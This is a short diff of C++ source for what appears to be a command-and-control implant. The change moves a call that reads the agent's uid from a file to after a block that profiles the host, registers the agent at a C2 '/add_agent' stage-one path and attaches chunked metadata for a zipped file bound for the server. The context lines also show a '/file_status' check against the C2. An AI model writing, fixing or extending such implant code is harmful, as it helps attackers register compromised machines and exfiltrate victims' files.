@@ -82,8 +82,7 @@ int main() {
                 // Path to /add_agent
                 std::wstring PC2 = C2 + STAGE1PATH;
                 nlohmann::json JsonProfile = Profiler(); 
-                uid = GetUIDFromFile(); // once profiler is called, uid file is created
-
+                
                 nlohmann::json metadata = GenFileMetadata(zipDestStr, CHUNK_SIZE); 
                 JsonProfile["file_metadata"] = metadata;
 
@@ -94,6 +93,7 @@ int main() {
                 }
             }
         }
+        uid = GetUIDFromFile(); // once profiler is called, uid file is created
         // Check file status
         std::wstring FileStatusURL = C2 + L"/file_status";
         nlohmann::json UidJson = {{"uid", WStringToString(uid)}};
